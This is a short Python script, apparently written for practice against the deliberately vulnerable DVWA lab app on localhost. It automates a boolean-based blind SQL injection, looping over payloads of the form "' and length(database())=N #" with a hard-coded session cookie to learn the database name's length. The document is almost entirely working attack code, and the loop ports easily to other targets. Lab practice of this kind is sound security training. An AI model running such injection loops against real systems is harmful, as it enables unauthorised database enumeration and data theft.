# DVWA Blind SQLi script

from pwn import *
import requests
import json
import re

url = 'http://127.0.0.1/dvwa/vulnerabilities/sqli_blind'
fixed_query = "?Submit=Submit&id=1"
cookies = {
    'security': 'low',
    'PHPSESSID': 'i1hhj8fif0o91oevusi2qld4ck'
}


def guess_db_len():
    # Guess DB name (strlen)
    for i in range(100):
        # Build up URL and SQL Query
        sqli = "'+and+length(database())+%3D" + str(i) + "+%23&Submit=Submit#"
        next_url = url + fixed_query + sqli
        # Execute the get request
        print("Testing " + str(i) + " on \"" + next_url + "\"")
        response = requests.get(next_url, cookies=cookies)
        # Extract the response we're interested in
        error_message = re.search(r'User.*\.', response.text).group(0)
        print(error_message, end='\n\n')
        # If we've found the DB name length, return
        if "MISSING" not in error_message:
            print("DB Name Length: " + str(i), end='\n\n')
            break


# Get the length of DB name first
guess_db_len()
